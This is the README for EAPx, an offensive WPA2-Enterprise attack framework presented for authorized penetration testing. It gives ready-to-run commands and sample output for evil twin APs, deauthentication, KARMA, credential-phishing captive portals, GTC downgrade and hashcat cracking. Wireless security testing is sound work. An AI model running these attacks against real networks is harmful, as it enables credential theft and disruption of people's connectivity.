# EAPx — WPA2-Enterprise Attack Framework

```
███████╗ █████╗ ██████╗ ██╗  ██╗
██╔════╝██╔══██╗██╔══██╗╚██╗██╔╝
█████╗  ███████║██████╔╝ ╚███╔╝
██╔══╝  ██╔══██║██╔═══╝  ██╔██╗
███████╗██║  ██║██║     ██╔╝ ██╗
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
```

**EAPx** is an all-in-one WPA2-Enterprise (802.1X/EAP) penetration testing framework built for authorized red-team engagements. It automates the full attack chain — from network discovery and EAP method fingerprinting to evil twin deployment, credential capture, and offline hash cracking.

> ⚠️ **Legal Disclaimer:** This tool is intended for **authorized security testing only**. Unauthorized use against networks you do not own or have explicit permission to test is **illegal**. The author assumes no liability for misuse.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [CLI Reference](#cli-reference)
  - [menu](#menu--interactive-guided-mode)
  - [setup](#setup--generate-certs--check-dependencies)
  - [scan](#scan--discover-enterprise-networks)
  - [attack](#attack--full-attack-pipeline)
  - [deauth](#deauth--deauthentication-attack)
  - [harvest](#harvest--passive-identity-harvesting)
  - [karma](#karma--karma-attack)
  - [portal](#portal--hostile-captive-portal)
  - [crack](#crack--offline-hash-cracking)
  - [report](#report--generate-pentest-report)
- [Attack Workflow](#attack-workflow)
- [Project Structure](#project-structure)
- [Output & Loot](#output--loot)
- [Author](#author)

---

## Features

| Module | Description |
|--------|-------------|
| **Scanner** | Discovers WPA2-Enterprise (MGT) networks via `airodump-ng` |
| **Evil Twin AP** | Spawns a rogue access point mimicking the target SSID with `hostapd` |
| **EAP Probe** | Fingerprints supported EAP methods (PEAP, TTLS, TLS, FAST, GTC, etc.) |
| **Deauth** | 802.11 deauthentication attack to force client reconnection |
| **Identity Harvester** | Passively captures EAP identity responses off the wire |
| **KARMA** | Auto-spawns fake APs for every probed SSID seen in the air |
| **Hostile Portal** | Captive portal phishing page that harvests domain credentials |
| **AutoCrack** | Watches for captured hashes and auto-cracks with hashcat + rockyou |
| **Cert Wizard** | Generates fake CA + server certificates for the rogue RADIUS server |
| **Reporter** | Generates a Markdown pentest report with risk rating |

---

## Installation

### Requirements

- **OS:** Kali Linux (recommended) or any Debian-based distro
- **Hardware:** Wireless adapter that supports **monitor mode** and **packet injection** (e.g. Alfa AWUS036ACH)
- **Python:** 3.10+
- **Privileges:** Root access (required for monitor mode, hostapd, and raw sockets)

### Quick Install

```bash
git clone https://github.com/bxbySAMRAT/eapx.git
cd eapx
sudo bash install.sh
```

The installer will:
1. Install system dependencies (`hostapd`, `aircrack-ng`, `hashcat`, `dnsmasq`, `macchanger`, etc.)
2. Install Python libraries (`scapy`, `flask`, `netaddr`, `colorama`)
3. Generate fake RADIUS certificates in `certs/`
4. Decompress the `rockyou.txt` wordlist

### Manual Install

```bash
# System packages
sudo apt install -y hostapd aircrack-ng openssl iw net-tools \
  dnsmasq macchanger hashcat tmux python3 python3-pip \
  python3-scapy python3-flask python3-netaddr python3-colorama wordlists

# Python packages
sudo apt update
sudo apt install python3-scapy python3-flask python3-netaddr python3-colorama

# Generate certificates
sudo python3 eapx.py setup
```

---

## Quick Start

The fastest way to get started is the interactive menu:

```bash
sudo python3 eapx.py menu
```

This presents a numbered menu where you select an attack mode and provide inputs interactively — no need to remember CLI flags.

For more control, use the CLI subcommands documented below.

---

## CLI Reference

EAPx uses a subcommand-based CLI. Every command (except `setup`, `crack`, and `report`) requires root privileges and a wireless interface in **monitor mode**.

### Putting Your Adapter in Monitor Mode

Before running any wireless commands, enable monitor mode:

```bash
sudo airmon-ng start wlan0
# Your interface is now wlan0mon
```

---

### `menu` — Interactive Guided Mode

```bash
sudo python3 eapx.py menu
```

Launches a numbered menu that walks you through every attack mode with prompts. Ideal for first-time use. The menu covers all 10 operations: setup, scan, full attack, evil twin, deauth, KARMA, identity harvest, hostile portal, hash cracking, and report generation.

---

### `setup` — Generate Certs & Check Dependencies

```bash
sudo python3 eapx.py setup
```

Verifies that all required system tools are installed and generates fake CA + server certificates used by the rogue RADIUS server. **Run this once before your first attack.**

Output:
```
[+] All dependencies found
[*] Generating CA certificate...
[*] Generating server key and CSR...
[*] Signing server certificate with CA...
[+] Certificates generated in certs/
[+] Setup complete. You can now run attacks.
```

---

### `scan` — Discover Enterprise Networks

```bash
sudo python3 eapx.py scan -i <interface> [-t <seconds>]
```

| Flag | Description | Default |
|------|-------------|---------|
| `-i`, `--iface` | Monitor-mode interface | *required* |
| `-t`, `--time` | Scan duration in seconds | `15` |

Scans the airwaves using `airodump-ng` and filters for WPA2-Enterprise (802.1X/MGT) networks only. Displays results in a formatted table.

**Example:**
```bash
sudo python3 eapx.py scan -i wlan0mon -t 20
```

Output:
```
[*] Scanning for WPA2-Enterprise networks on wlan0mon (20s)...

╔═══╦══════════════════════╦═══════════════════╦══════════╗
║ # ║ BSSID                ║ ESSID             ║ Channel  ║
╠═══╬══════════════════════╬═══════════════════╬══════════╣
║ 1 ║ AA:BB:CC:DD:EE:FF    ║ CorpWiFi          ║ ch 6     ║
║ 2 ║ 11:22:33:44:55:66    ║ eduroam           ║ ch 1     ║
╚═══╩══════════════════════╩═══════════════════╩══════════╝

[+] Found 2 enterprise network(s)
```

---

### `attack` — Full Attack Pipeline

```bash
sudo python3 eapx.py attack -i <interface> [options]
```

This is the **main command** — it chains multiple modules together for a full automated attack. If `--essid` is not provided, it runs an interactive scan first and lets you pick a target.

| Flag | Description | Default |
|------|-------------|---------|
| `-i`, `--iface` | Monitor-mode interface | *required* |
| `--essid` | Target network SSID (skip scan if set) | *auto-scan* |
| `--bssid` | Target AP BSSID | `None` |
| `--channel` | Channel to operate on | `6` |
| `--negotiate` | EAP negotiation mode | `balanced` |
| `--scan-time` | Auto-scan duration (seconds) | `15` |
| `--no-deauth` | Skip deauthentication | enabled |
| `--no-clone-mac` | Don't clone the target AP's MAC address | enabled |
| `--no-boost` | Don't increase TX power to 30dBm | enabled |
| `--no-probe` | Skip EAP method fingerprinting | enabled |
| `--no-harvest` | Skip identity harvesting | enabled |
| `--no-autocrack` | Don't auto-crack captured hashes | enabled |
| `--no-report` | Skip report generation | enabled |

#### Negotiation Modes

| Mode | Behavior |
|------|----------|
| `balanced` | Accept PEAP, TTLS, TLS, FAST with GTC, MSCHAPV2, MD5, PAP inner methods |
| `gtc-downgrade` | Force clients to downgrade to GTC (captures plaintext passwords) |
| `default` | Standard MSCHAPV2/MD5 only |

**Example — Full auto attack with scan:**
```bash
sudo python3 eapx.py attack -i wlan0mon
# → Scans → Select target → Probes EAP → Deauths → Launches evil twin
#   → Harvests identities → Auto-cracks hashes → Generates report
```

**Example — Targeted attack, no deauth:**
```bash
sudo python3 eapx.py attack -i wlan0mon \
  --essid "CorpWiFi" --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 --negotiate gtc-downgrade --no-deauth
```

**Example — Minimal evil twin only:**
```bash
sudo python3 eapx.py attack -i wlan0mon \
  --essid "CorpWiFi" --channel 6 \
  --no-deauth --no-probe --no-harvest --no-autocrack --no-report
```

---

### `deauth` — Deauthentication Attack

```bash
sudo python3 eapx.py deauth -i <interface> --bssid <AP_MAC> [options]
```

| Flag | Description | Default |
|------|-------------|---------|
| `-i`, `--iface` | Monitor-mode interface | *required* |
| `--bssid` | Target AP MAC address | *required* |
| `--client` | Specific client MAC (omit for broadcast) | broadcast |
| `--count` | Number of deauth frames to send | `100` |
| `--continuous` | Loop indefinitely until Ctrl+C | off |

Sends 802.11 deauthentication frames to disconnect clients from the target AP, forcing them to reassociate (ideally to your evil twin).

**Example — Deauth all clients continuously:**
```bash
sudo python3 eapx.py deauth -i wlan0mon \
  --bssid AA:BB:CC:DD:EE:FF --continuous
```

**Example — Deauth a specific client (200 frames):**
```bash
sudo python3 eapx.py deauth -i wlan0mon \
  --bssid AA:BB:CC:DD:EE:FF --client 11:22:33:44:55:66 --count 200
```

---

### `harvest` — Passive Identity Harvesting

```bash
sudo python3 eapx.py harvest -i <interface> [-t <seconds>]
```

| Flag | Description | Default |
|------|-------------|---------|
| `-i`, `--iface` | Monitor-mode interface | *required* |
| `-t`, `--time` | Sniff duration in seconds | `60` |

Passively sniffs 802.1X (EAP) traffic and extracts EAP identity responses. Reveals usernames/email addresses without launching any attack.

**Example:**
```bash
sudo python3 eapx.py harvest -i wlan0mon -t 120
```

Output:
```
[*] Harvesting EAP identities on wlan0mon
[*] Duration: 120s | Saving to loot/identities.txt

[IDENTITY] john.doe@corp.local            | MAC: AA:BB:CC:DD:EE:FF
[IDENTITY] admin@corp.local               | MAC: 11:22:33:44:55:66

[+] Harvested 2 unique identities
```

---

### `karma` — KARMA Attack

```bash
sudo python3 eapx.py karma -i <interface>
```

| Flag | Description | Default |
|------|-------------|---------|
| `-i`, `--iface` | Monitor-mode interface | *required* |

Listens for 802.11 probe requests and automatically spawns a fake WPA2-Enterprise AP for **every SSID** a client is looking for. Runs until you press Ctrl+C.

**Example:**
```bash
sudo python3 eapx.py karma -i wlan0mon
```

Output:
```
[*] KARMA active on wlan0mon — listening for all probe requests...

[KARMA] Probe → SSID: 'CorpWiFi' | MAC: AA:BB:CC:DD:EE:FF
[KARMA] AP spawned for 'CorpWiFi'
[KARMA] Probe → SSID: 'eduroam' | MAC: 11:22:33:44:55:66
[KARMA] AP spawned for 'eduroam'
```

---

### `portal` — Hostile Captive Portal

```bash
sudo python3 eapx.py portal -i <interface> --essid <SSID> [--channel <ch>]
```

| Flag | Description | Default |
|------|-------------|---------|
| `-i`, `--iface` | Monitor-mode interface | *required* |
| `--essid` | SSID for the open rogue AP | *required* |
| `--channel` | Channel | `6` |

Launches an **open** rogue AP and serves a fake corporate login page on port 80. When a victim enters credentials, they are logged to `loot/ad_creds.txt`.

**Example:**
```bash
sudo python3 eapx.py portal -i wlan0mon --essid "Guest-WiFi" --channel 1
```

Output:
```
[*] Hostile portal on http://0.0.0.0:80
[*] Credentials saved to loot/ad_creds.txt

[!!!] PORTAL CRED CAPTURED: [2026-03-25 02:00:00] CORP\john.doe:P@ssw0rd | IP: 10.0.0.5
```

---

### `crack` — Offline Hash Cracking

```bash
sudo python3 eapx.py crack -f <hash_file> [-m <mode>]
```

| Flag | Description | Default |
|------|-------------|---------|
| `-f`, `--file` | Path to file containing hashes (one per line) | *required* |
| `-m`, `--mode` | Hashcat mode: `5500` = NTLMv1, `5600` = NTLMv2 | `5500` |

Reads hashes from the file and cracks each one using **hashcat** with the `rockyou.txt` wordlist and `best64.rule` rules. Cracked passwords are saved to `loot/cracked_passwords.txt`.

**Example:**
```bash
sudo python3 eapx.py crack -f loot/hashes.txt -m 5600
```

Output:
```
[AUTOCRACK] Cracking with mode 5600...

[!!!] ══════════════════════════════════
[!!!] CRACKED → P@ssw0rd123
[!!!] ══════════════════════════════════
```

---

### `report` — Generate Pentest Report

```bash
sudo python3 eapx.py report [--essid <SSID>] [--bssid <BSSID>] [--channel <ch>]
```

| Flag | Description | Default |
|------|-------------|---------|
| `--essid` | Target SSID for the report | `unknown` |
| `--bssid` | Target BSSID | `unknown` |
| `--channel` | Channel | `6` |

Generates a Markdown (.md) pentest report in `report/`. The report automatically includes any data from `loot/` (identities, hashes, cracked passwords, portal creds) and assigns a risk rating:

| Rating | Condition |
|--------|-----------|
| 🔴 CRITICAL | Plaintext credentials obtained |
| 🟠 HIGH | Credential hashes captured |
| 🟡 MEDIUM | User identities exposed |
| 🟢 LOW | No credentials obtained |

**Example:**
```bash
sudo python3 eapx.py report --essid "CorpWiFi" --bssid AA:BB:CC:DD:EE:FF
```

---

## Attack Workflow

Here's the typical flow during a WPA2-Enterprise pentest:

```
┌─────────────┐     ┌──────────────┐     ┌──────────────┐
│  1. Setup   │ ──▶ │   2. Scan    │ ──▶ │  3. Probe    │
│ (certs/deps)│     │ (find MGT    │     │ (fingerprint │
│             │     │  networks)   │     │  EAP methods)│
└─────────────┘     └──────────────┘     └──────────────┘
                                                │
                    ┌──────────────┐             ▼
                    │  5. Evil     │     ┌──────────────┐
                    │  Twin AP     │ ◀── │  4. Deauth   │
                    │ (rogue       │     │ (force client │
                    │  RADIUS)     │     │  reconnection)│
                    └──────┬───────┘     └──────────────┘
                           │
              ┌────────────┼────────────┐
              ▼            ▼            ▼
       ┌───────────┐ ┌──────────┐ ┌──────────┐
       │ Harvest   │ │ Capture  │ │ Portal   │
       │ Identities│ │ Hashes   │ │ Phish    │
       └───────────┘ └────┬─────┘ └──────────┘
                          ▼
                    ┌──────────┐     ┌──────────┐
                    │ AutoCrack│ ──▶ │  Report  │
                    │ (hashcat)│     │  (.md)   │
                    └──────────┘     └──────────┘
```

---

## Project Structure

```
eapx/
├── eapx.py              # Main entry point (CLI + interactive menu)
├── install.sh            # One-command installer for Kali
├── requirement.txt       # Python dependencies
├── README.md
├── .gitignore
├── modules/
│   ├── scanner.py        # WPA2-Enterprise network discovery
│   ├── rogue_ap.py       # Evil twin AP via hostapd
│   ├── eap_probe.py      # EAP method fingerprinting
│   ├── deauth.py         # 802.11 deauthentication
│   ├── identity.py       # EAP identity harvesting
│   ├── karma.py          # KARMA auto-AP attack
│   ├── hostile_portal.py # Captive portal credential phishing
│   ├── autocrack.py      # Hash watcher + hashcat cracker
│   └── cert_wizard.py    # Fake certificate generation
├── report/
│   └── reporter.py       # Pentest report generator
├── certs/                # Generated certificates (git-ignored)
└── loot/                 # Captured credentials (git-ignored)
```

---

## Output & Loot

All captured data is saved to `loot/`:

| File | Contents |
|------|----------|
| `identities.txt` | Harvested EAP usernames with MACs and timestamps |
| `hashes.txt` | Captured NTLM/MSCHAPv2 challenge-response hashes |
| `cracked_passwords.txt` | Successfully cracked plaintext passwords |
| `ad_creds.txt` | Portal-captured domain credentials (domain\user:pass) |

Reports are saved to `report/pentest_<ESSID>_<timestamp>.md`.

---

## Author

**Aryan Shetty** — [@babySAMRAT](https://github.com/babySAMRAT)

---

## License

This project is for **educational and authorized testing purposes only**.
# eapx
